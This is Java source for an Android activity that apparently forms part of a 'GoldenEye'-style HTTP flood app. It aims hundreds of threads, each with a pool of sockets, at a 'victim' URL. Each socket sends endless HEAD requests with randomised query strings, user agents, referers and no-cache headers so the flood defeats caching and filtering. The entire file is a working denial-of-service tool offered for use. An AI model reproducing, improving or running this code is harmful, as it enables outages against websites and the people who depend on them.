package org.wroot.android.goldeneye;

import java.io.IOException;
import java.io.InterruptedIOException;
import java.io.OutputStream;
import java.net.Socket;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Random;

import android.app.Activity;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class AttackActivity extends Activity {
	
	public boolean runnable = true;
	private URL _victim_url = null;
	private int _nr_threads = 500;
		
	private List<AsyncTask<URL, Integer, Integer>> _attack_threads = new ArrayList<AsyncTask<URL, Integer, Integer>>();


	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) {
	    super.onCreate(savedInstanceState);	
        setContentView(R.layout.attack);
        
        // Load Intent for variables
        Intent currentIntent = getIntent();   
        
        try {
        	
	        this._victim_url = new URL(currentIntent.getStringExtra("victimHost"));
	        	
        } catch (Exception ex) {
        	
        } finally {
        	
        	this._nr_threads = currentIntent.getIntExtra("nrThreads",500);

	        // Set UI texts
	        TextView uiVictimUrlLabel = (TextView) findViewById(R.id.ui_victim_hostname_label);
	        uiVictimUrlLabel.setText(currentIntent.getStringExtra("victimHost"));
	        
	        Toast.makeText(this, R.string.hulk_taunt, Toast.LENGTH_SHORT).show();
	        
	        // Bind 'Stop Attack' Button Activity
	        Button cancelButton = (Button) findViewById(R.id.stop_attack_btn);
	        cancelButton.setOnClickListener(cancelClickListener);
	        
	        for (int i = 0; i < this._nr_threads;i++) {
	        	AsyncTask<URL, Integer, Integer> aTask = new AttackTask().execute(this._victim_url);
	        	this._attack_threads.add(aTask);
	        }//end :: for
	        

        }//end :: try/catch
        
	}
	
	private OnClickListener cancelClickListener = new OnClickListener() {
		public void onClick(View v) {
			cancel();
		}//end :: onClick
	};// end :: OnClickListener
	
	public void cancel() {
		
		Iterator<AsyncTask<URL, Integer, Integer>> iterator = this._attack_threads.iterator();
		while (iterator.hasNext()) {
			iterator.next().cancel(true);
		}//end :: while		
		
        // Load Intent for variables
        Intent currentIntent = getIntent();
        setResult(RESULT_CANCELED, currentIntent);
        finish();
		
	}//end :: cancel


	


	private class AttackTask extends AsyncTask<URL, Integer, Integer> {
	    
		public boolean runnable = true;
		
		private String _protocol = "http";
		private String _host = "";
		private String _path = "";
		private String _query = "";

		private int _port = 80;
		private int _connCount = 100;
		private int _sockCount = 100;
		
		private int _ok_count = 0;
		private int _failed_count = 0;
		
		private final List<SocketBucket> _attack_sockets = new LinkedList<SocketBucket>();
		
		protected void onCancelled() {
			this.runnable = false;
		}
		
		@Override
		protected Integer doInBackground(URL... urls) {
			
			URL victimUrl = urls[0];
			
	        // Load Intent for variables
	        Intent currentIntent = getIntent();  			
			
	        this._host = victimUrl.getHost();
	        this._port = victimUrl.getPort();
	        this._protocol = victimUrl.getProtocol();
	        this._path = victimUrl.getPath();
	        this._query = victimUrl.getQuery();
	        this._connCount = currentIntent.getIntExtra("nrConn", 128);
	        this._sockCount = currentIntent.getIntExtra("nrSock", 100);
	        
	        if ("".equals(this._path)) this._path = "/";
	        			
	        if (this._port == -1) {
	        	this._port = (this._protocol.equals("http")) ? 80 : 443;
	        }//end :: if
	        
			while (this.runnable) {
								
				this._attack_sockets.clear(); // clear socket pool
				
				// Add sockets to pool
				for (int i=0;i<this._sockCount; i++) {
					try {
						Socket socket = null;
						socket = new Socket(this._host, this._port);
						this._attack_sockets.add(new SocketBucket(socket));
						//this._attack_sockets.notify();
					} catch (Exception e) {
						Log.e(e.getClass().getName(), e.getMessage(), e);
					}//end :: try/catch					
					
				}//end :: for
								
				try {
					
					//Log.v("Host", this._host);
					//Log.v("Port", String.valueOf(this._port));
		        	//Log.v("Protocol",this._protocol);
					
				
					for (int i=0; i<this._connCount; i++){
						
						if (!this.runnable) break;
						
						Iterator<SocketBucket> it = this._attack_sockets.iterator();
						
						while (it.hasNext()) {
							if (!this.runnable) break;
							
							SocketBucket bucket = (SocketBucket)it.next();
							
							try {
								String httpRequest = this.buildRequest();		
								//Log.v("Request",httpRequest);
							  	bucket.out.write(httpRequest.getBytes());
							  	this._ok_count++;							  	
							} catch(InterruptedIOException ex) {
					              // just skip this socket
				            } catch(IOException ex) {
				            	it.remove();
				  				this._failed_count++;
				  				Log.e(ex.getClass().getName(), ex.getMessage(), ex);					
							}//end :: try/catch
							
							Integer progress[] = new Integer[2];
							
							progress[0] = this._ok_count;
							progress[1] = this._failed_count;
							
							this.publishProgress(progress);
							
						}
																										
					}//end :: for
					
				  	
				} catch (Exception e) {
					Log.e(e.getClass().getName(), e.getMessage(), e);
				}//end :: try/catch	
				
				this.closeSockets();
				
			}//end :: while
			
			Log.v("End of Thread Running","True");
			
			return this._ok_count;
			
		}//end :: doInBackground
		
		private void closeSockets() {
			Iterator<SocketBucket> it = this._attack_sockets.iterator();
			while (it.hasNext()) {
				SocketBucket bucket = (SocketBucket)it.next();
				try {
					bucket.socket.close();
					it.remove();					
				} catch (IOException ex) {
					// silently ignore. socket already dead
				}
			}
		}//end :: closeSockets()
		
		protected void onProgressUpdate(Integer... progress) {
			Log.v("Ok",String.valueOf(progress[0]));
			Log.v("Failed",String.valueOf(progress[1]));
			
			int curOk = 0;
			int curFailed = 0;
			
			TextView attacksOk = (TextView) findViewById(R.id.attack_hits_ok);
			curOk = Integer.parseInt((String) attacksOk.getText());
			curOk += progress[0];
	        attacksOk.setText(String.valueOf(curOk));
	        
	        TextView attacksFailed = (TextView) findViewById(R.id.attack_hits_failed);
	        curFailed = Integer.parseInt((String) attacksFailed.getText());
	        curFailed += progress[1];
	        attacksFailed.setText(String.valueOf(curFailed));
	     }
		
		private String buildRequest() {
			
			List<String> httpHeaders = this.generateHeaders();
			
			StringBuilder httpRequest = new StringBuilder();
			
			for (String header : httpHeaders) {
				httpRequest.append(header);
				httpRequest.append("\r\n");
			}//end :: for
			
			// Finalize request
			httpRequest.append("\r\n");					
					
			return httpRequest.toString();
			
		}//end :: buildRequest
		
		private List<String> generateHeaders() {
			
			List<String> headers = new ArrayList<String>();
			
			// Generate random parameters
			String fakeQueryString = this.generateFakeQueryString();
			String _request_url = String.format("%s?%s", this._path, fakeQueryString);
			String fakeNoCache = this.generateFakeNoCache();
			String fakeUserAgent = this.generateFakeUserAgent();
			String fakeAcceptEncoding = this.generateFakeAcceptEncoding();
			
			// Random headers
			if (this.coinFlip()) {
				String fakeContentType = this.generateFakeNoCache();
				headers.add(String.format("Content-Type: %s", fakeContentType));
			}// end :: if
			
			if (this.coinFlip()) {
				String fakeAcceptCharset = this.generateFakeAcceptCharset();
				headers.add(String.format("Accept-Charset: %s", fakeAcceptCharset));
			}// end :: if
			
			if (this.coinFlip()) {
				String fakeReferer = this.generateFakeReferer();
				headers.add(String.format("Referer: %s", fakeReferer));
			}// end :: if
			
			if (this.coinFlip()) {
				String fakeCookie = this.generateFakeQueryString();
				headers.add(String.format("Cookie: %s", fakeCookie));
			}// end :: if
			
			
			// Format parameters
			
			headers.add(String.format("Host: %s", this._host));
			headers.add(String.format("Cache-Control: %s", fakeNoCache));
			headers.add(String.format("User-Agent: %s", fakeUserAgent));
			headers.add(String.format("Accept-Encoding: %s", fakeAcceptEncoding));
			headers.add(String.format("Keep-Alive: %d", this.randInt(110, 120)));
			
			Collections.shuffle(headers); // scramble!
			
			headers.add(0, String.format("HEAD %s HTTP/1.1", _request_url)); // add to top
			headers.add("Connection: Keep-Alive"); // add to bottom
			
			return headers;
			
		}//end :: generateHeaders
		
		private String generateFakeAcceptCharset() {
			
			List<String> charsets = new ArrayList<String>();
			
			charsets.add("ISO-8859-1");
			charsets.add("utf-8");
			charsets.add("Windows-1251");
			charsets.add("ISO-8859-2");
			charsets.add("ISO-8859-15");
			 
			Collections.shuffle(charsets); 
						
			return String.format("%s,%s;q=%.2f,*;=%.2f", charsets.get(0), charsets.get(1), this.randFloat(0.1f, 1.0f), this.randFloat(0.1f, 1.0f));
		}

		private String generateFakeAcceptEncoding() {
			
			List<String> acceptEncodings = new ArrayList<String>();
			
			acceptEncodings.add("''");
			acceptEncodings.add("*");
			acceptEncodings.add("identity");
			acceptEncodings.add("gzip");
			acceptEncodings.add("deflate");

			Collections.shuffle(acceptEncodings);
						
			return String.format("%s, %s", acceptEncodings.get(0), acceptEncodings.get(1));
		}

		private String generateFakeReferer() {
			
			List<String> referers = new ArrayList<String>();
			
			String fakeQuery = this.buildRandomBlock(this.randInt(3,8));
			
            referers.add(String.format("http://www.google.com/?q=%s",fakeQuery));
            referers.add(String.format("http://www.usatoday.com/search/results?q=%s",fakeQuery));
            referers.add(String.format("http://engadget.search.aol.com/search?q=%s",fakeQuery));
            referers.add(String.format("http://%s/", this._host)); 

			Collections.shuffle(referers);
			
			return referers.get(0); // first item
		}

		private String generateFakeUserAgent() {
			
			List<String> userAgents = new ArrayList<String>();
			
			userAgents.add("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3");
			userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729");
			userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729");
			userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1");
			userAgents.add("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1");
			userAgents.add("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)");
			userAgents.add("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729");
			userAgents.add("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0");
			userAgents.add("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2");
			userAgents.add("Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US");
			userAgents.add("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP");
			userAgents.add("Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51");
			
			Collections.shuffle(userAgents);
			
			return userAgents.get(0); // first item
		}

		private String generateFakeNoCache() {
			List<String> noCache = new ArrayList<String>();
			
			noCache.add("no-cache");
			noCache.add("must-revalidate");
			
			Collections.shuffle(noCache);
									
			return this.joinList(noCache, ", ");
		}
		
		private String joinList(List<String> list, String glue) {
			
			Iterator<String> pieces = list.iterator();
					
			StringBuilder s = new StringBuilder();
	        while (pieces.hasNext()) {
	            s.append(pieces.next());

	            if (pieces.hasNext()) {
	                s.append(glue);
	            }//end :: if
	        }//end :: while
	        
	        return s.toString();
						
		}//end :: joinList
		
		private boolean coinFlip() {
			
			Random r = new Random();			
			return (boolean) (r.nextInt(2) > 0);
			
		}//end :: coinFlip
		
		private String generateFakeQueryString() {
			
			StringBuilder queryString = new StringBuilder();
			
			if (this._query != null) {
				queryString.append(this._query);
				queryString.append('&');
			}//end :: if
			
			int nrTuples = this.randInt(1, 6);
			
			for (int i = 0; i<nrTuples;i++) {
				
				String tupleKey = this.buildRandomBlock(this.randInt(3, 8));
				String tupleValue = this.buildRandomBlock(this.randInt(3, 20));
				
				queryString.append(String.format("%s=%s", tupleKey, tupleValue));
				
				if (i < (nrTuples-1)) queryString.append('&');
				
			}//end :: for
			
			return queryString.toString();
			
		}//end :: generateFakeQueryString
		
		private String buildRandomBlock(int len) {
			
			StringBuilder randomBlock = new StringBuilder();
			
			final String validChars = "ABCDEFGHIJKLKMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0987654321";
			final int validCharsLen = validChars.length(); 
			
			Random r = new Random();
			
			for (int i = 0; i<len; i++) {
				char randomChar = validChars.charAt(r.nextInt(validCharsLen));
				randomBlock.append(randomChar);
			}//end :: for
			
			return randomBlock.toString();
			
		}//end :: buildRandomBlock
		
		private int randInt(int start, int end) {
			
			Random r = new Random();
			int randomInt = r.nextInt((end-start)+1) + (start);
			
			return randomInt;
		}//end :: randInt
		
		private float randFloat(float start, float end) {
			
			Random r = new Random();
			float randomFloat = r.nextFloat() * (end - start) + start;
			
			return randomFloat;
		}//end :: randInt
		
	}//end :: AttackTask
	
	private class SocketBucket {
	    public final Socket socket;
	    public final OutputStream out;
	    public SocketBucket(Socket socket) throws IOException {
	      this.socket = socket;
	      out = socket.getOutputStream();
	      socket.setSoTimeout(1);  // VERY short timeout
	    }
	  }
	
}//end :: AttackActivity